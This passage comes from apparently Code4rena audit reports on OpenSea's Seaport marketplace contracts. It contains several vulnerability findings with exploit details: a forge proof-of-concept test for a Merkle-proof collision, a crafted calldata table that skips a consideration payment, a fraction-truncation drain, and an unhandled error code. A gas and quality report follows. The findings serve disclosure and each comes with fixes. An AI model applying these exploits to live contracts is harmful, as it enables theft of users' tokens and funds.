for this criteria. An attacker can now acquire the NFT with tokenId `0xe90b7bceb6e7df5418fb78d8ee546e97c83a08bbccc01a0644d599ccd2a7c2e0` (or, generally, any other intermediate hash value) and fulfill the trade.  > One might argue that this attack is not feasible because the provided hash is random and tokenIds are generally a counter. However, this is not required in the standard. >  > "While some ERC-721 smart contracts may find it convenient to start with ID 0 and simply increment by one for each new NFT, callers SHALL NOT assume that ID numbers have any specific pattern to them, and MUST treat the ID as a 'black box'." [EIP721](https://eips.ethereum.org/EIPS/eip-721) > > Neither do the standard OpenZeppelin/Solmate implementations use a counter. They only provide internal `_mint(address to, uint256 id)` functions that allow specifying an arbitrary `id`. NFT contracts could let the user choose the token ID to mint, especially contracts that do not have any linked off-chain metadata like Uniswap LP positions. > Therefore, ERC721-compliant token contracts are vulnerable to this attack.  #### POC Here's a `forge` test ([gist](https://gist.github.com/MrToph/ccf5ec112b481e70dbf275aa0a3a02d6)) that shows the issue for the situation mentioned in _Example_.  ```solidity contract BugMerkleTree is BaseOrderTest {     struct Context {         ConsiderationInterface consideration;         bytes32 tokenCriteria;         uint256 paymentAmount;         address zone;         bytes32 zoneHash;         uint256 salt;     }      function hashHashes(bytes32 hash1, bytes32 hash2)         internal         returns (bytes32)     {         // see MerkleProof.verify         bytes memory encoding;         if (hash1 <= hash2) {             encoding = abi.encodePacked(hash1, hash2);         } else {             encoding = abi.encodePacked(hash2, hash1);         }         return keccak256(encoding);     }      function testMerkleTreeBug() public resetTokenBalancesBetweenRuns {         // Alice wants to buy NFT ID 1 or 2 for token1. compute merkle tree         bytes32 leafLeft = bytes32(uint256(1));         bytes32 leafRight = bytes32(uint256(2));         bytes32 merkleRoot = hashHashes(leafLeft, leafRight);         console.logBytes32(merkleRoot);          Context memory context = Context(             consideration,             merkleRoot, /* tokenCriteria */             1e18, /* paymentAmount */             address(0), /* zone */             bytes32(0), /* zoneHash */             uint256(0) /* salt */         );         bytes32 conduitKey = bytes32(0);          token1.mint(address(alice), context.paymentAmount);         // @audit assume there's a token where anyone can acquire IDs. smaller IDs are more valuable         // we acquire the merkle root ID         test721_1.mint(address(this), uint256(merkleRoot));          _configureERC20OfferItem(             // start, end             context.paymentAmount, context.paymentAmount         );         _configureConsiderationItem(             ItemType.ERC721_WITH_CRITERIA,             address(test721_1),             // @audit set merkle root for NFTs we want to accept             uint256(context.tokenCriteria), /* identifierOrCriteria */             1,             1,             alice         );          OrderParameters memory orderParameters = OrderParameters(             address(alice),             context.zone,             offerItems,             considerationItems,             OrderType.FULL_OPEN,             block.timestamp,             block.timestamp + 1000,             context.zoneHash,             context.salt,             conduitKey,             considerationItems.length         );          OrderComponents memory orderComponents = getOrderComponents(             orderParameters,             context.consideration.getNonce(alice)         );         bytes32 orderHash = context.consideration.getOrderHash(orderComponents);         bytes memory signature = signOrder(             context.consideration,             alicePk,             orderHash         );          delete offerItems;         delete considerationItems;          /*************** ATTACK STARTS HERE ***************/         AdvancedOrder memory advancedOrder = AdvancedOrder(             orderParameters,             1, /* numerator */             1, /* denominator */             signature,             ""         );          // resolve the merkle root token ID itself         CriteriaResolver[] memory cr = new CriteriaResolver[](1);         bytes32[] memory proof = new bytes32[](0);         cr[0] = CriteriaResolver(               0, // uint256 orderIndex;               Side.CONSIDERATION, // Side side;               0, // uint256 index; (item)               uint256(merkleRoot), // uint256 identifier;               proof // bytes32[] criteriaProof;         );          uint256 profit = token1.balanceOf(address(this));         context.consideration.fulfillAdvancedOrder{             value: context.paymentAmount         }(advancedOrder, cr, bytes32(0));         profit = token1.balanceOf(address(this)) - profit;          // @audit could fulfill order without owning NFT 1 or 2         assertEq(profit, context.paymentAmount);     } } ```  ## Recommended Mitigation Steps Usually, this is fixed by using a type-byte that indicates if one is computing the hash for a _leaf_ or not. An elegant fix here is to simply [use hashes of the tokenIds](https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/CriteriaResolution.sol#L250) as the leaves - instead of the tokenIds themselves. (Note that this is the natural way to compute merkle trees if the data size is not already the hash size.) Then compute the leaf hash in the contract from the provided tokenId:  ```diff function _verifyProof(     uint256 leaf,     uint256 root,     bytes32[] memory proof ) internal pure {     bool isValid;  -    assembly { -        let computedHash := leaf +  bytes32 computedHash = keccak256(abi.encodePacked(leaf))   ... ```  There can't be a collision between a leaf hash and an intermediate hash anymore as the former is the result of hashing 32 bytes, while the latter are the results of hashing 64 bytes.  Note that this requires off-chain changes to how the merkle tree is generated. (Leaves must be hashed first.)   
# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349   # Vulnerability details  When fulfilling a basic order we need to assert that the parameter `totalOriginalAdditionalRecipients` is less or equal than the length of `additionalRecipients` written in calldata. However in `_prepareBasicFulfillmentFromCalldata` this assertion is incorrect [(L346)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L346-L349): ```js         // Ensure supplied consideration array length is not less than original.         _assertConsiderationLengthIsNotLessThanOriginalConsiderationLength(             parameters.additionalRecipients.length + 1,             parameters.totalOriginalAdditionalRecipients         ); ``` The way the function it's written ([L75](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/Assertions.sol#L75-L83)), it accepts also a length smaller than the original by 1 (basically there shouldn't be a `+ 1` in the first argument).  Interestingly enough, in the case `additionalRecipients.length < totalOriginalAdditionalRecipients`, the inline-assembly for-loop at [(L506)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L506) will read consideration items out-of-bounds. This can be a vector of exploits, as illustrated below.  ## Proof of Concept Alice makes the following offer: a basic order, with two `considerationItem`s. The second item has the following data: ```js consideration[1] = {  itemType: ...,  token: ...,  identifierOrCriteria: ...,  startAmount: X,  endAmount: X,  recipient: Y, } ``` The only quantities we need to track are the amounts `X` and recipient `Y`.  When fulfilling the order normally, the fulfiller will spend `X` tokens sending them to `Y`. It's possible however to exploit the previous bug in a way that the fulfiller won't need to make this transfer.  To do this, the fulfiller needs to craft the following calldata:  | calldata pointer |   correct calldata   |   exploit calldata  | |-----------------:|:--------------------:|:-------------------:| |              ... |          ...         |         ...         | |            0x204 |   1 (tot original)   |   1 (tot original)  | |            0x224 |  0x240 (head addRec) | 0x240 (head addRec) | |            0x244 |   0x2a0 (head sign)  |  0x260 (head sign)  | |            0x264 |   1 (length addRec)  |  0 (length addRec)  | |            0x284 |      X (amount)      |   X (length sign)   | |            0x2a4 |     Y (recipient)    |    Y (sign body)    | |            0x2c4 |  0x40 (length sign)  |   0x00 (sign body)  | |            0x2e4 | [correct Alice sign] |         ...         | |            0x304 | [correct Alice sign] |         ...         | |                  |                      |                     |  Basically writing `additionalRecipients = []` and making the signature length = `X`, with `Y` being the first 32 bytes. Of course this signature will be invalid; however it doesn't matter since the exploiter can call `validate` with the correct signature beforehand.  The transaction trace will look like this: - the assertion `_assertConsiderationLengthIsNotLessThanOriginalConsiderationLength` passes; - the `orderHash` calculated is the correct one, since the for-loop over original consideration items picks up calldata at pointers {0x284, 0x2a4} [(L513)](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/BasicOrderFulfiller.sol#L513-L550); - the order was already validated beforehand, so the signature isn't read; - at the end, during the tokens transfers, only `offer` and `consideration[0]` are transferred, since the code looks at `additionalRecipients` which is empty.  Conclusion:  Every Order that is "basic" and has two or more consideration items can be fulfilled in a way to not trade the _last_ consideration item in the list. The fulfiller spends less then normally, and a recipient doesn't get his due.  There's also an extra requirement which is stricter: this last item's `startAmount` (= endAmount) needs to be smallish (< 1e6). This is because this number becomes the signature bytes length, and we need to fill the calldata with extra zeroes to complete it. Realistically then the exploit will work only if the item is a ERC20 will low decimals.  I've made a hardhat test that exemplifies the exploit. [(Link to gist)](https://gist.github.com/0xsanson/e87e5fe26665c6cecaef2d9c4b0d53f4).  ## Recommended Mitigation Steps Remove the `+1` at L347.  
# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L228 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L231 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L237 https://github.com/code-423n4/2022-05-opensea-seaport/blob/4140473b1f85d0df602548ad260b1739ddd734a5/contracts/lib/OrderValidator.sol#L238   # Vulnerability details  ## Impact  A partial order's fractions (`numerator` and `denominator`) can be reset to `0` due to a truncation. This can be used to craft malicious orders:  1. Consider user Alice, who has 100 ERC1155 tokens, who approved all of their tokens to the `marketplaceContract`. 2. Alice places a `PARTIAL_OPEN` order with 10 ERC1155 tokens and consideration of ETH. 3. Malory tries to fill the order in the following way:     1. Malory tries to fill 50% of the order, but instead of providing the fraction `1 / 2`, Bob provides `2**118 / 2**119`. This sets the `totalFilled` to `2**118` and `totalSize` to `2**119`.     2. Malory tries to fill 10% of the order, by providing `1 / 10`. The computation `2**118 / 2**119 + 1 / 10` is done by "cross multiplying" the denominators, leading to the acutal fraction being `numerator = (2**118 * 10 + 2**119)` and `denominator = 2**119 * 10`.     3. Because of the `uint120` truncation in [OrderValidator.sol#L228-L248](https://github.com/ProjectOpenSea/seaport/blob/6c24d09fc4be9bbecf749e6a7a592c8f7b659405/contracts/lib/OrderValidator.sol#L228-L248), the `numerator` and `denominator` are truncated to `0` and `0` respectively.     4. Bob can now continue filling the order and draining any approved (1000 tokens in total) of the above ERC1155 tokens, for the same consideration amount!   ## Proof of Concept   For a full POC: https://gist.github.com/hrkrshnn/7c51b23f7c43c55ba0f8157c3b298409  The following change would make the above POC fail: ```diff modified   contracts/lib/OrderValidator.sol @@ -225,6 +225,8 @@ contract OrderValidator is Executor, ZoneInteraction {                  // Update order status and fill amount, packing struct values.                  _orderStatus[orderHash].isValidated = true;                  _orderStatus[orderHash].isCancelled = false; +                require(filledNumerator + numerator <= type(uint120).max, "overflow"); +                require(denominator <= type(uint120).max, "overflow");                  _orderStatus[orderHash].numerator = uint120(                      filledNumerator + numerator                  ); @@ -234,6 +236,8 @@ contract OrderValidator is Executor, ZoneInteraction {              // Update order status and fill amount, packing struct values.              _orderStatus[orderHash].isValidated = true;              _orderStatus[orderHash].isCancelled = false; +            require(numerator <= type(uint120).max, "overflow"); +            require(denominator <= type(uint120).max, "overflow");              _orderStatus[orderHash].numerator = uint120(numerator);              _orderStatus[orderHash].denominator = uint120(denominator);          } ```  ## Tools Used  Manual review  ## Recommended Mitigation Steps  A basic fix for this would involve adding the above checks for overflow / truncation and reverting in that case. However, we think the mechanism is still flawed in some respects and require more changes to fully fix it. See a related issue: "A malicious filler can fill a partial order in such a way that the rest cannot be filled by anyone" that points out a related but a more fundamental issue with the mechanism.   
# Lines of code  https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L406   # Vulnerability details  ## Impact   The `_aggregateValidFulfillmentOfferItems()` function aims to revert on orders with zero value or where a total consideration amount overflows. Internally this is accomplished by having a temporary variable `errorBuffer`, accumulating issues found, and only reverting once all the items are processed in case there was a problem found. This code is optimistic for valid inputs.  Note: there is a similar issue in `_aggregateValidFulfillmentConsiderationItems()` , which is reported separately.  The problem lies in how this `errorBuffer` is updated: ```solidity                 // Update error buffer (1 = zero amount, 2 = overflow).                 errorBuffer := or(                   errorBuffer,                   or(                     shl(1, lt(newAmount, amount)),                     iszero(mload(amountPtr))                   )                 ) ```  The final error handling code: ```solidity             // Determine if an error code is contained in the error buffer.             switch errorBuffer             case 1 {                 // Store the MissingItemAmount error signature.                 mstore(0, MissingItemAmount_error_signature)                  // Return, supplying MissingItemAmount signature.                 revert(0, MissingItemAmount_error_len)             }             case 2 {                 // If the sum overflowed, panic.                 throwOverflow()             } ```  While the expected value is `0` (success),  `1` or `2` (failure), it is possible to set it to `3`, which is unhandled and considered as a "success". This can be easily accomplished by having both an overflowing item and a zero item in the order list.  This validation error could lead to fulfilling an order with a consideration (potentially ~0) lower than expected.  ## Proof of Concept  Craft an offer containing two errors (e.g. with  zero amount and overflow). Call `matchOrders()`. Via calls to `_matchAdvancedOrders()`, `_fulfillAdvancedOrders()`, `_applyFulfillment()`, `_aggregateValidFulfillmentOfferItems()` will be called. The `errorBuffer` will get a value of 3  (the `or` of 1 and 2). As the value of 3 is not detected, no error will be thrown and the order will be executed, including the mal formed values.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  1. Change the check on [FulfillmentApplier.sol#L465](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L465)  to consider `case 3`. 2. Potential option: Introduce an early abort in case `errorBuffer != 0` on [FulfillmentApplier.sol#L338](https://github.com/code-423n4/2022-05-opensea-seaport/blob/main/contracts/lib/FulfillmentApplier.sol#L338)  
# Quality Report  Repo commit referenced: [`49799ce156d979132c9924a739ae45a38b39ecdd`](https://github.com/ProjectOpenSea/seaport/tree/49799ce156d979132c9924a739ae45a38b39ecdd)  ## BasicOrderFulfiller.sol  ### 1. Adding a new variable to the assembly  For lines [82-86](https://github.com/ProjectOpenSea/seaport/blob/49799ce156d979132c9924a739ae45a38b39ecdd/contracts/lib/BasicOrderFulfiller.sol#L82-L86), we can define a new YUL variable, `basicOrderType` to remove the need to call `calldataload` twice and also adding the `BasicOrder_basicOrderType_cdPtr` twice to the stack, the modified code block  would look like this:  ```solidity let basicOrderType := calldataload(BasicOrder_basicOrderType_cdPtr)  // Mask all but 2 least-significant bits to derive the order type. orderType := and(basicOrderType, 3)  // Divide basicOrderType by four to derive the route. route := div(basicOrderType, 4) ```  This would make the code more readable and also should require less gas.  ### 2. Missing parameter NatSpec info  Function `_transferERC20AndFinalize` is missing a NatSpec info for `accumulator`. Need to add:  ```solidity * @param accumulator An open-ended array that collects transfers to execute *                    against a given conduit in a single call. ```  ## ConsiderationStructs.sol  Typo in `SpentItem` NatSpec comment `d` is missing from `and` (Line [`68`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/ConsiderationStructs.sol#L68)):  ```diff - * @dev A spent item is translated from a utilized offer item an has four +  * @dev A spent item is translated from a utilized offer item and has four ```  ## CriteriaResolution.sol  ### 1. Modify For loops to save gas  On line [`56`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L56) and [`166`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L166) the for loops can be modified to:  ```solidity uint256 i = 0;  // Iterate over each criteria resolver. for (; i < totalCriteriaResolvers;) {     ...     ++i; }  i = 0;  // Iterate over each advanced order. for (; i < totalAdvancedOrders;) {     ...     ++i; } ```  Note. We don't need to use `unchecked` for `++i` since both for loop blocks are child nodes of a bigger `unchecked` block.  The same modification can be made for the for loops with the `j` counter on line [`184`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L185) and [`199`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L199).  ### 2. Redundant array element lookup One line `177`, the ith element of `advancedOrders` is lookup even though that element is already have been saved in memory as `advancedOrder`  Current (lines [`168-178`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L168-178)):  ```solidity AdvancedOrder memory advancedOrder = advancedOrders[i];  // Skip criteria resolution for order if not fulfilled. if (advancedOrder.numerator == 0) {     continue; }  // Retrieve the parameters for the order. OrderParameters memory orderParameters = (     advancedOrders[i].parameters ); ```  So we can reuse `advancedOrder` and the modified block would be:  ```solidity AdvancedOrder memory advancedOrder = advancedOrders[i];  // Skip criteria resolution for order if not fulfilled. if (advancedOrder.numerator == 0) {     continue; }  // Retrieve the parameters for the order. OrderParameters memory orderParameters = (     advancedOrder.parameters ); ```  ie: ```diff - advancedOrders[i].parameters + advancedOrder.parameters ```  ## Executor.sol  Using the `AccumulatorArmed` defined constants from `ConsiderationConstants.sol`, we can rewrite [Executor.sol:L433](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/Executor.sol#L433):  ```diff // file: contracts/lib/Executor.sol:L433  - if (accumulator.length != 64) { + if (accumulator.length != AccumulatorArmed) { ```  ## FulfillmentApplier.sol  ### 1. Typo in comment  The `if` block on lines [`180-183`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/FulfillmentApplier.sol#L180-L183) has typos for the comment before the `if` block:  ```solidity // Set the offerer as the receipient if execution amount is nonzero. if (execution.item.amount == 0) {     execution.item.recipient = payable(execution.offerer); } ```  `nonzero` needs to be changed to `zero` and `receipient` to `recipient`  ```diff - // Set the offerer as the receipient if execution amount is nonzero. + // Set the offerer as the recipient if execution amount is zero. ```  ## GettersAndDerivers.sol  ### 1. Typo Typo in comment on line [`131`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L131), `offer items` should be `consideration items`:  ```diff - // Iterate over the offer items (not including tips). + // Iterate over the consideration items (not including tips). ```  ### 2. Unpredictable Memory Location  On line [`170`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L170) a memory location has been set with an unpredictable address/content:  ```solidity let typeHashPtr := sub(orderParameters, OneWord) ```   ## OrderCombiner.sol  For the function `_validateOrdersAndPrepareToFulfill` is the `maximumFulfilled` has been reached, the loop keeps continuing without essentailly doing anything other than wasting gas, since on line `196` it keeps jumping to the next `i` value. The `continue` statement on line `196` should be replaced by the `break` statement to exit the loop. ([Ref](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L181-L197))  ```diff for (uint256 i = 0; i < totalOrders; ++i) {     // Retrieve the current order.     AdvancedOrder memory advancedOrder = advancedOrders[i];      // Determine if max number orders have already been fulfilled.     if (maximumFulfilled == 0) {         // Mark fill fraction as zero as the order will not be used.         advancedOrder.numerator = 0;          // Update the length of the orderHashes array.         assembly {             mstore(orderHashes, add(i, 1))         }          // Continue iterating through the remaining orders. -        continue; +        break;     } ```  ## OrderFulfiller.sol  To optimize the for loop in Lines [468-475](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L468-L475)  The code block below:   ```solidity // Skip overflow check as the index for the loop starts at zero. unchecked {     // Iterate over the given orders.     for (uint256 i = 0; i < totalOrders; ++i) {         // Convert to partial order (1/1 or full fill) and update array.         advancedOrders[i] = _convertOrderToAdvanced(orders[i]);     } } ```  can be changed too:  ```solidity // Skip overflow check as the index for the loop starts at zero. unchecked {     // Iterate over the given orders.     uint256 i = 0;     for (; i < totalOrders;) {         // Convert to partial order (1/1 or full fill) and update array.         advancedOrders[i] = _convertOrderToAdvanced(orders[i]);          ++i;     } } ```  ## TokenTransferrer.sol  In the function  `_performERC1155BatchTransfers(ConduitBatch1155Transfer[] calldata batchTransfers)` on line `542` the `data` length offset value is incorrect.  ```solidity // Set the length of the data array in memory to zero. mstore(     add(         BatchTransfer1155Params_data_length_basePtr,         idsAndAmountsSize     ),     0 ) ```  This value is used to call a `safeBatchTransferFrom(address from, address to, uint256[] ids, uint256[] amounts, bytes data)` endpoint on a `ERC1155` contract.  The formula for the offset should be:  $$   \text{data\_length\_offset} = \mathtt{0x20} + \mathtt{0x04} + \mathtt{0xa0} + \text{idsAndAmountsSize}  \\ = \mathtt{0xc4} + \text{idsAndAmountsSize}  $$  Currently the offset is $\mathtt{0x104} + \text{idsAndAmountsSize}$ which expands memory 2 words extra more than the necessary amount.  Here is an example (cast from foundry):  ``` >> cast abi-encode "safeBatchTransferFrom(address,address,uint256[],uint256[],bytes)" 0x8496a8EDc4A0894123062194015c0Cf86b7A277c 0x8496a8EDc4A0894123062194015c0Cf86b7A277c [] [] 0x  0x00 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c from 0x20 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c to 0x40 00000000000000000000000000000000000000000000000000000000000000a0 head(ids) 0x60 00000000000000000000000000000000000000000000000000000000000000c0 head(amounts) 0x80 00000000000000000000000000000000000000000000000000000000000000e0 head(data) 0xa0 0000000000000000000000000000000000000000000000000000000000000000 ids_length 0xc0 0000000000000000000000000000000000000000000000000000000000000000 amounts_length 0xe0 0000000000000000000000000000000000000000000000000000000000000000 data_length ```  The above ABI encoding does not include the `ZeroSlot` in the memory and also the function signature after adding those according to the instruction in `_performERC1155BatchTransfers` we would get:  ``` 0x000 0000000000000000000000000000000000000000000000000000000000000000 ZeroSlot 0x004 2eb2c2d6 0x024 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c from 0x044 0000000000000000000000008496a8edc4a0894123062194015c0cf86b7a277c to 0x064 00000000000000000000000000000000000000000000000000000000000000a0 head(ids) 0x084 00000000000000000000000000000000000000000000000000000000000000c0 head(amounts) 0x0a4 00000000000000000000000000000000000000000000000000000000000000e0 head(data) 0x0c4 0000000000000000000000000000000000000000000000000000000000000000 ids_length 0x0e4 0000000000000000000000000000000000000000000000000000000000000000 amounts_length 0x104 0000000000000000000000000000000000000000000000000000000000000000 data_length ```  In this example we have `idsAndAmountsSize` = `0x40` = `TwoWords` and the constant `BatchTransfer1155Params_data_length_basePtr` = `0x104` (based on TokenTransferrerConstants.sol), so according to the line `TokenTransferrer.sol:542` the `data_length` memory offset would need to be `0x144` which is outside of the neccesssary memory area.  To fix this error, these changes need to be applied:  Block before change:  ```solidity // file: contract/lib/TokenTransferrer:L541  // Set the length of the data array in memory to zero. mstore(     add(         BatchTransfer1155Params_data_length_basePtr,         idsAndAmountsSize     ),     0 )  // Determine the total calldata size for the call to transfer. let transferDataSize := add(     BatchTransfer1155Params_data_length_basePtr,     mul(idsLength, TwoWords) ) ```  Block after change:  ```solidity // file: contract/lib/TokenTransferrer:L541  // Determine the total calldata size for the call to transfer. let transferDataSize := add(     BatchTransfer1155Params_data_length_basePtr,     idsAndAmountsSize )  // Set the length of the data array in memory to zero. mstore(     transferDataSize,     0 ) ```  and also the following constant would need to be updated:  ```diff // file: contract/lib/TokenTransferrerConstants.sol:L146  - uint256 constant BatchTransfer1155Params_data_length_basePtr = 0x104; + uint256 constant BatchTransfer1155Params_data_length_basePtr = 0xc4; ```  The change above removes uses less arithmetic operation which in turn would also save some gas.  ## ZoneInteractions.sol  For the function `_assertRestrictedAdvancedOrderValidity` on lines [104-113](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/ZoneInteraction.sol#L104-L113), `offerer` and `zone` are passed as two extra inputs although `advancedOrder` contains those 2 parameters.  ```solidity function _assertRestrictedAdvancedOrderValidity(     AdvancedOrder memory advancedOrder,     CriteriaResolver[] memory criteriaResolvers,     bytes32[] memory priorOrderHashes,     bytes32 orderHash,     bytes32 zoneHash,     OrderType orderType,     address offerer,     address zone ) internal view { ```  These parameters can be accessed as:  ```solidity advancedOrder.parameters.offerer advancedOrder.parameters.zone ```  This brings up the question if the extra inputs were provided like that to save gas, since using `advancedOrder.parameters.VARIABLE` would require the compiler to use extra instruction to calculate the memory offset and also load those variables to memory. This extra work was perhaps done in a function calling `_assertRestrictedAdvancedOrderValidity`.  ## ZoneInteractionErrors.sol  There is typo on line [`13`](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/interfaces/ZoneInteractionErrors.sol#L13) in the NatSpec comment:  `offerrer` replaced by `offerer` ```diff - either the offerrer or the order's zone or approved as valid by the + either the offerer or the order's zone or approved as valid by the ```  ## For loops The for loops in these FILES:LINES   - [Conduit.sol:66](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/conduit/Conduit.sol#L66) - [Conduit.sol:130](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/conduit/Conduit.sol#L130) - [BasicFulfiller.sol:948](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L948) - [BasicFulFiller.sol:1040](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L1040) - [CriteriaResolution.sol:56](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L56) - [CriteriaResolution.sol:166](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L166) - [CriteriaResolution.sol:184](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L184) - [CriteriaResolution.sol:199](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L199) - [OrderCombiner.sol:181](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L181) - [OrderCombiner.sol:247](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L247) - [OrderCombiner.sol:291](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L291) - [OrderCombiner.sol:373](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L373) - [OrderCombiner.sol:473](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L473) - [OrderCombiner.sol:498](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L498) - [OrderCombiner.sol:577](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L577) - [OrderCombiner.sol:598](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L598) - [OrderCombiner.sol:621](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L621) - [OrderCombiner.sol:754](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderCombiner.sol#L754) - [OrderFulfiller.sol:217](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L217) - [OrderFulfiller.sol:306](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L306) - [OrderFulfiller.sol:471](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderFulfiller.sol#L471) - [OrderValidator.sol:272](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderValidator.sol#L272) - [OrderValidator.sol:350](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/OrderValidator.sol#L350)  can be changed.  General structure used: ```solidity for (uint256 i = 0; CONDITION; ++i) { ... } ```  Change to: ```solidity uint256 i = 0;  for (; CONDITION;) {      ...     unchecked {          ++i;     }  } ```  The `unchecked` inner block might not be necessary since some of the loops are inside a bigger `unchecked` block.  and for the assembly blocks in FILES:LINES:  - [BasicOrderFulfiller.sol:506](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L506) - [BasicOrderFulfiller.sol:615](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/BasicOrderFulfiller.sol#L615) - [CriteriaResolution.sol:256](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/CriteriaResolution.sol#L256) - [GettersAndDerivers.sol:78](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L78) - [GettersAndDerivers.sol:133](https://github.com/ProjectOpenSea/seaport/blob/49799ce156/contracts/lib/GettersAndDerivers.sol#L133)  General structure used: ```solidity for { initial }{ condition }{ increment } { ... } ```  Change to ```solidity initial  for {}{ condition }{} {      ...      increment } ```
